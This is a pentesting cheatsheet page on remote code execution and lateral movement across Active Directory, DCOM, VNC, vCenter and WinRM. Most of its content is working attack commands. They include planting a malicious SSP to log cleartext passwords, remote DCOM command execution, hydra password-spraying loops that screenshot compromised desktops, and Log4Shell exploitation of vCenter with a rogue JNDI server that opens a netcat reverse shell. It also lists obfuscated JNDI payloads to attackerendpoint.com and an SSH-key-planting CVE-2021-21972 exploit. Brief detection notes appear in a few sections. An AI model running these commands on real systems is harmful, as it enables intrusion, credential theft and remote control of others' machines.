---
layout: post
title: pen / move / rce 2
category: pen
parent: cheatsheets
modified_date: 2024-11-28
permalink: /pen/move/rce2
---

**Mitre Att&ck Entreprise**: 
* [TA0006 - Credentials Access](https://attack.mitre.org/tactics/TA0006/)
* [T1021  - Remote Services](https://attack.mitre.org/techniques/T1021/)

**Menu**
<!-- vscode-markdown-toc -->
* [activedirectory](#activedirectory)
	* [custom-ssp](#custom-ssp)
	* [sid-history](#sid-history)
* [docker](#docker)
	* [administration](#administration)
	* [grype-vuln-scan-with-scan](#grype-vuln-scan-with-scan)
	* [java-maven-applications](#java-maven-applications)
	* [jdbc-client](#jdbc-client)
	* [unsecure-azure-registry](#unsecure-azure-registry)
* [rcp](#rcp)
* [rdp](#rdp)
* [sambacry](#sambacry)
* [smb](#smb)
	* [dcom](#dcom)
	* [impacket](#impacket)
		* [atexec](#atexec)
		* [dcomexec](#dcomexec)
		* [psexec](#psexec)
		* [smbexec](#smbexec)
	* [invoke-SMBRemoting](#invoke-SMBRemoting)
	* [powershell](#powershell)
		* [enter-pssession](#enter-pssession)
		* [copy-item](#copy-item)
	* [xcopy](#xcopy)
* [ssh](#ssh)
* [sso-saml](#sso-saml)
* [vnc](#vnc)
	* [password-spraying](#password-spraying)
	* [test-valid-accounts-hydra](#test-valid-accounts-hydra)
	* [screenshots-4-pwned-desktop](#screenshots-4-pwned-desktop)
	* [stats-4-pwned-desktop](#stats-4-pwned-desktop)
	* [file-transfer](#file-transfer)
* [vcenter](#vcenter)
	* [CVE-2021-44228-VCenter](#CVE-2021-44228-VCenter)
	* [CVE-2021-44228-VCenter](#CVE-2021-44228-VCenter-1)
	* [CVE-2021-21972-VCenter](#CVE-2021-21972-VCenter)
* [winrm](#winrm)
	* [service-activation](#service-activation)
	* [client-evil-winrm](#client-evil-winrm)
	* [client-winrs](#client-winrs)
* [wmi](#wmi)
	* [wmiexec](#wmiexec)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

[](assets/images/pen-ta0007-discov-t1046-scan-net-svc.png)

## <a name='activedirectory'></a>activedirectory

### <a name='custom-ssp'></a>custom-ssp

- drop the dhe malicious SSP 'mimilib.dll' in C:\Windows\System32\ to log passwords in clear-textll 
- after a reboot all credentials can be found in clear text in C:\Windows\System32\kiwissp.log

▶️ PLAY :
```powershell
# get a list existing LSA Security Packages
reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

# add mimilib.dll to the Security Support Provider list (Security Packages)
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"

# can also inject the malicious SSP in memory / won't survive reboots
privilege::debug
misc::memssp
```

**mitigation**

- Event ID 4657 - Audit creation/change of HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages

### <a name='sid-history'></a>sid-history

[T1134.005](https://attack.mitre.org/techniques/T1134/005/)

- ensure continued access to resources from the 'former domain' (target) to the 'ObjectSid' attribute on account objects
- generate a golden or diamond ticket adding a 'privileged group' of the 'former domain' in the '/sids' arg of any 'krb8 tickets forger tool' (rubeus, mimikatz, pypykatz, bettersafetykatz, ...)
- 'privileged group' RID: 512 (Domain Admins), 519 (Enterprise Admins)

▶️ PLAY :
```powershell
# find the SID of the former domain
Get-DomainGroup -Identity "Domain Admins" -Domain dollarcorp.local -Properties ObjectSid

# generate a golden / diamond ticket
```

**detection**

- [](https://adsecurity.org/?p=1772)

```powershell
# enumerate all users with data in the SID History attribute and flag the ones with the 'Same Domain SID History'
Import-Module ActiveDirectory
[string]$DomainSID = ( (Get-ADDomain).DomainSID.Value )
Get-ADUser -Filter “SIDHistory -Like ‘*'” -Properties SIDHistory | Where { $_.SIDHistory -Like “$DomainSID-*” }

# detection via Domain Controller Events
# requires the configuration of the sub-category auditing under Account Management,  “Audit User Account Management” (success) on DCs for :
#   4765: SID History was added to an account.
#   4766: An attempt to add SID History to an account failed.
```

**mitigation**


## <a name='docker'></a>docker

!! MUST TO READ :
- [PayloadAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#summary)
- [infosecwriteups - attacking-and-securing-docker-containers](https://infosecwriteups.com/attacking-and-securing-docker-containers-cc8c80f05b5b)

### <a name='administration'></a>administration
```
docker system info
ls -alps /var/lib/docker
docker inspect | jq 
```

### <a name='grype-vuln-scan-with-scan'></a>grype-vuln-scan-with-scan

```bash
grype <image> -o template -t ~/path/to/csv.tmpl
cut -f3 -d"," grivy_output.csv > /tmp/mycve.txt
while read cve; do toto=`echo $cve | tr -d \"`; grep -i $toto /usr/share/exploitdb/files_exploits.csv; done < /tmp/mycve.txt
```

Here's what the csv.tmpl file might look like:
```bash
"Package","Version Installed","Vulnerability ID","Severity"
```

### <a name='java-maven-applications'></a>java-maven-applications 
```
# extract application
jar xf app.jar

# find Spring properties files
find . -iname "*.properties"
find -iname "*.properties" -print | xargs grep -r "://"
find -iname "*.properties" -print | xargs grep -r "jdbc.*://"
find -iname "*.properties" -print | xargs grep -r "postgresql://"
```

### <a name='jdbc-client'></a>jdbc-client
```
alias jaqy='java -Dfile.encoding=UTF-8 -Xmx256m -jar ~/jaqy-1.2.0.jar'
jaqy

# jdbc:teradata
.protocol teradata com.teradata.jdbc.TeraDriver
.classpath teradata lib/terajdbc4.jar
.open -u dbc -p dbc teradata://127.0.0.1

# jdbc:postgresql
.protocol postgresql org.postgresql.driver
.classpath postgresql lib/postgresql-42.5.3.jar
.open -u dbc -p dbc postgresql://127.0.0.1
```

### <a name='unsecure-azure-registry'></a>unsecure-azure-registry
```
curl -s -k --user "USER:PASS" https://registry.azurecr.io/v2/_catalog | jq '.repositories'
curl -s -k --user "USER:PASS" https://registry.azurecr.io/v2/<image_name>/tags/list | jq '.tags'
podman pull --creds "USER:PASS" registry.azurecr.io/<image_name>:<tag>
```

- [https://aex.dev.azure.com/me?mkt=en-US](https://aex.dev.azure.com/me?mkt=en-US)



## <a name='rcp'></a>rcp

* service-port   : 
* service-process: 
* artifacts      : 

## <a name='rdp'></a>rdp

* service-port   : 
* service-process: 
* artifacts      : 

**sources**
* [TA0008 - Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
* [T1563  - Remote session hijacking](https://attack.mitre.org/techniques/T1563/002/)
* [Masky](https://github.com/Z4kSec/Masky) 🔥🔥🔥
* [Remote session hijacking - hackingarticles.in](https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/)

## <a name='sambacry'></a>sambacry

* CVE ID : CVE-2017-7494
* Date: 01/06/2017
* Snort rules : [ptresearch github](https://github.com/ptresearch/AttackDetection/blob/master/CVE-2017-7494/CVE-2017-7494.rules)
 
▶️ PLAY :
![Pentest Linux Sambacry](/assets/images/pen-lin-smb-rce-2017-7494_1.png)
![Pentest Linux Sambacry](/assets/images/pen-lin-smb-rce-2017-7494_2.png)
![Pentest Linux Sambacry](/assets/images/pen-lin-smb-rce-2017-7494_3.png)
![Pentest Linux Sambacry](/assets/images/pen-lin-smb-rce-2017-7494_4.png)

## <a name='smb'></a>smb


* service-port   : 
* service-process: 
* artifacts      : 


### <a name='dcom'></a>dcom

▶️ PLAY :
```powershell
# dcom shellwindows
ShellWindows:-
$calc = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.x.x.7"))
$calc[0].Document.Application.ShellExecute("calc.exe")

# dcom shellbrowserwindow
$calc2 = [activator]::CreateInstance([type]::GetTypeFromCLSID("c08afd90-f2a1-11d1-8455-00a0c91f3880","10.x.x.7"))
$calc[0].Document.Application.ShellExecute("cmd.exe", "/c (whoami & hostname & dir c:\) > c:\temp\test.txt", "c:\windows\system32", $null, 7)

# dcom mmc20
$shell = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.x.x.7"))
$shell = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.x.x.7"))
$shell.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami & hostname > c:\temp\test.txt","7")
```

🔎️ DETECT :
```powershell
# DCOM Attack Monitor
Security Event Log / Event ID is any of 4104
and when the event matches Command (custom) contains all of [activator or CreateInstance]
and when the event matches Command (custom) contains any of  [GetTypeFromCLSID or GetTypeFromProgID]
and when the event matches Command (custom) contains any of [9BA05972-F6A8-11CF-A442-00A0C90A8F39 or c08afd90-f2a1-11d1-8455-00a0c91f3880 or 7e0423cd-1119-0928-900c-e6d4a52a0715 or MMC20.Application]

# DCOM Lateral Movement Detection
Security Event Log / Event ID is any of 4104
and when the event matches Command (custom) contains any of [Document.Application.ShellExecute or Document.ActiveView.ExecuteShellCommand]
```

### <a name='impacket'></a>impacket

#### <a name='atexec'></a>atexec
#### <a name='dcomexec'></a>dcomexec
#### <a name='psexec'></a>psexec
#### <a name='smbexec'></a>smbexec

### <a name='invoke-SMBRemoting'></a>invoke-SMBRemoting

[Invoke-SMBRemoting](https://github.com/Leo4j/Invoke-SMBRemoting)

### <a name='powershell'></a>powershell

* [PowerMeUp](https://github.com/ItsCyberAli/PowerMeUp)
* [pwncat](https://github.com/calebstewart/pwncat)
* [PSRemoting](https://www.jmvwork.xyz/sysadmin/sys-win-ps-useful-queries/#PSCredentialinitialization)

#### <a name='enter-pssession'></a>enter-pssession


#### <a name='copy-item'></a>copy-item

### <a name='xcopy'></a>xcopy
https://ss64.com/nt/xcopy.html

## <a name='ssh'></a>ssh

* service-port   : 
* service-process: 
* artifacts      : 

## <a name='sso-saml'></a>sso-saml

- [forge SAML token](https://attack.mitre.org/techniques/T1606/002/)


## <a name='vnc'></a>vnc

* service-port   : 
* service-process: 
* artifacts      : 

### <a name='password-spraying'></a>password-spraying

**Case 1** : vnc_pwd == $ztarg_computer_name 
```bash
# // terminator || tmux / vsplit panel 1 / monitor progression
# // terminator || tmux / vsplit panel 1 / monitor progression / tail 
tail -f pt_XXX_hydra_vnc_output.txt

# // terminator || tmux / vsplit panel 0 / hsplit panel 0 / 
# // terminator || tmux / vsplit panel 0 / hsplit panel 0 / run / pwd spraying over vnc using hydra /
while read ztarg_computer_fqdn; do vnc_pwd=$(echo $ztarg_computer_name | cut -d"." -f1 | tr '[:upper:]' '[:lower:]'); hydra  -p $vnc_pwd vnc://$ztarget_computer_fqdn -w 2/0 -t 4 >> pt_XXX_hydra_vnc_output.txt; done < pt_XXX_getnetcomputers_OU_XXX_all.txt

# // terminator || tmux / vsplit panel 0 / hsplit panel 1 / monitor progression / 
# // terminator || tmux / vsplit panel 0 / hsplit panel 1 / monitor progression / get success conns / 
grep -c successfully pt_XXX_hydra_vnc_output.txt
grep -c "^\[5900\]" pt_XXX_hydra_vnc_output.txt
# // terminator || tmux / vsplit panel 0 / hsplit panel 1 / monitor progression / 
# // terminator || tmux / vsplit panel 0 / hsplit panel 1 / monitor progression / check last $ztarg_computer_name displayed by 'vsplit panel 1 / tail' /
grep -n  $ztarg_computername pt_XXX_getnetcomputers_OU_XXX_all.txt.txt
```

### <a name='test-valid-accounts-hydra'></a>test-valid-accounts-hydra 
```bash
# // terminator || tmux / vsplit panel 0 / hsplit panel 1 / return / format output & list zpwned_computer_name
grep "^\[5900\]" pt_XXX_hydra_vnc_output.txt | cut -f3 -d " " > pt_XXX_hydra_vnc_pwned.txt
grep "^\[5900\]" -A 2 pt_XXX_hydra_vnc_output.txt | cut -f3 -d " " > pt_XXX_hydra_vnc_pwned.txt
```

### <a name='screenshots-4-pwned-desktop'></a>screenshots-4-pwned-desktop
```bash
while read ztarg_computer_fqdn; do export vnc_pwd=$(echo $ztarg_computer_fqdn | cut -d"." -f1 | tr '[:upper:]' '[:lower:]');   echo $vnc_pwd | vncpasswd -f > ./vnc_pwd.txt; echo -n $ztarg_computer_fqdn:; cat vnc_pwd.txt; vncsnapshot -passwd ./vnc_pwd.txt $ztarg_computer_fqdn pt_XXX_hydra_vnc_$ztarg_computer_fqdn.png >> pt_XXX_vncsnapshot_output.txt; done < pt_XXX_hydra_vnc_pwned.txt
```

### <a name='stats-4-pwned-desktop'></a>stats-4-pwned-desktop
```bash
# get the cn computer (1 line) and its OS (1 line) 
while read ztarg_computer_fqdn; python pywerview.py get-netcomputer --computername $ztarg_computer_fqdn -w $zdom_fqdn -u $ztarg_user_name -p XXX --dc-ip $zdom_dc_ip --attributes cn operatingSystem >> pt_XXX_getcomputer_XXX_os.txt; done < pt_XXX_hydra_vnc_pwned.txt

# format the result returned to CSV
i=0; while read line; do i=$(($i+1)); if [[ $i == 1 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' | tr '\n' ',' >> pt_XXX_getnetcomputer_XXX_os.csv ; elif [[ $i == 2 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' >> pt_XXX_getnetcomputer_XXX_os.csv; i=0; fi; done < pt_XXX_getcomputer_XXX_os.txt
```

Run the playbook [pen_enum_computers_os_piechart](https://github.com/jomivz/jomivz.github.io/playbook/pen_enum_computers_os_piechart.ipynb) to generate the chart pie per operating system.

![computers per OS](/assets/images/playbook_piechart_computers_per_os.png)

### <a name='file-transfer'></a>file-transfer

Tools to transfer files via VNC (works on Windows 10 only):

* [Invoke-Transfer](https://github.com/JoelGMSec/Invoke-Transfer)

## <a name='vcenter'></a>vcenter

* service-port   : 
* service-process: 
* artifacts      : 

### <a name='CVE-2021-44228-VCenter'></a>CVE-2021-44228-VCenter

```bash
# install
git clone https://github.com/veracode-research/rogue-jndi.git
apt install default-jdk
apt install java-common
apt install java-package

# check if Vcenter version is vulnerable
curl -ski https://1.2.3.4/ui/login | grep Location

# tmux windows 0 splitting
Ctrl-b %
Ctrl-b ->
Ctrl-b "

## cmds to run consequently in tmux windows 1, 2 and 3 

# HOOK STEP 1: rogue CURL query that hook VCenter to make an LDAP query 
curl --insecure  -vv -H "X-Forwarded-For: \${jndi:ldap://1.1.1.1:1389/o=tomcat}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="

# HOOK STEP 2: run a rogue LDAP server that hook VCenter, executing netcat back to us 
sudo java -jar target/RogueJndi-1.1.jar --command "nc -e /bin/bash 1.1.1.1 4242" --hostname "1.1.1.1"

# CHECK: 1/ the LDAP, and 2/ the netcat, hooks come back
sudo tcpdump -ni eth0 host 1.2.3.4

# tmux windows 1 splitting
Ctrl-b c
Ctrl-b %
Ctrl-b ->
Ctrl-b "

# REVERSE SHELL: 
nc -lvnp 4242
```

### <a name='CVE-2021-44228-VCenter-1'></a>CVE-2021-44228-VCenter
```bash
# install

# HOOK STEP 1: rogue CURL query that hook VCenter to make an LDAP query 
curl --insecure  -vv -H "X-Forwarded-For: \${jndi:ldap://1.1.1.1:1389/o=tomcat}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="

curl --insecure  -vv -H "X-Forwarded-For: \${\${env:ENV_NAME:-j}ndi\${env:ENV_NAME:-:}\${env:ENV_NAME:-l}dap\${env:ENV_NAME:-:}//1.1.1.1:1389/}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="

curl --insecure  -vv -H "X-Forwarded-For: \${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://1.1.1.1:1389/}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="

curl --insecure  -vv -H "X-Forwarded-For: \${\${lower:j}ndi:\${lower:l}\${lower:d}a\${lower:p}://1.1.1:1389/}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="

${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/}
```

### <a name='CVE-2021-21972-VCenter'></a>CVE-2021-21972-VCenter
```bash
sudo python3 CVE-2021-21972.py -t 1.2.3.3 -f /root/.ssh/id_rsa.pub -p /home/vsphere-ui/.ssh/authorized_keys -o unix
git clone https://github.com/ptoomey3/evilarc.git
python evilarc.py -d 5 -p 'home/vsphere-ui/.ssh' -o unix -f linexpl.tar home/vsphere-ui/.ssh
python evilarc.py -d 5 -p 'home/vsphere-ui/.ssh' -o unix -f linexpl.tar home/vsphere-ui/.ssh/id_rsa.pub
python evilarc.py -d 5 -p 'home/vsphere-ui/.ssh' -o unix -f linexpl.tar /home/vsphere-ui/.ssh/id_rsa.pub
python evilarc.py -d 5 -p '/home/vsphere-ui/.ssh' -o unix -f linexpl.tar /home/vsphere-ui/.ssh/id_rsa.pub
cd ../CVE-2021-21972/
sudo python3 CVE-2021-21972.py -t 1.2.3.3
python3 CVE-2021-21972.py -t 1.2.3.3
python3 CVE-2021-21972.py -t 1.2.3.4
```

## <a name='winrm'></a>winrm

* service-port   : 5985-5986
* service-process: [winrshost.exe](https://www.ired.team/offensive-security/lateral-movement/winrs-for-lateral-movement)
* artifacts      : [logs,mft,prefetch,usnjrnl](https://jpcertcc.github.io/ToolAnalysisResultSheet/details/WinRS.htm)

### <a name='service-activation'></a>service-activation
▶️ PLAY :
```powershell
winrm quickconfig
enable-psremoting
```

### <a name='client-evil-winrm'></a>client-evil-winrm
* [Evil-winrm](https://github.com/Hackplayers/evil-winrm):
▶️ PLAY :
```sh
evil-winrm -i $ztarg_computer_ip -u $ztarg_user_name -p $ztarg_user_pass
evil-winrm -i $ztarg_computer_ip -u $ztarg_user_name -H $ztarg_user_nthash
```

### <a name='client-winrs'></a>client-winrs

▶️ PLAY :
```powershell
# Run a dir command on a remote machine:
winrs -r:DemoServer3 dir

# Run an install package on a remote server:
winrs -r:Server25 msiexec.exe /i c:\install.msi /quiet

# Run a PowerShell script on the remote box:
winrs /r:DemoServer2 powershell.exe -nologo -noprofile -command d:\test\test.ps1

#You can’t open a full interactive remote PowerShell console, but as remoting is built-in to PowerShell 2.0 there is no need.
#Connecting to the remote server 'myserver'
winrs -r:https://myserver.com command
winrs -r:myserver.com -usessl command
winrs -r:myserver command
winrs -r:http://127.0.0.1 command
winrs -r:http://169.51.2.101:80 -unencrypted command
winrs -r:https://[::FFFF:129.144.52.38] command
winrs -r:http://[1080:0:0:0:8:800:200C:417A]:80 command
winrs -r:https://myserver.com -t:600 -u:administrator -p:$%fgh7 ipconfig
winrs -r:myserver -env:PATH=^%PATH^%;c:\tools -env:TEMP=d:\temp config.cmd
winrs -r:myserver netdom join myserver /domain:testdomain /userd:johns /passwordd:$%fgh789
```

## <a name='wmi'></a>wmi

* service-port   : 135-139
* service-process: 
* artifacts      : 

### <a name='wmiexec'></a>wmiexec

```powershell
```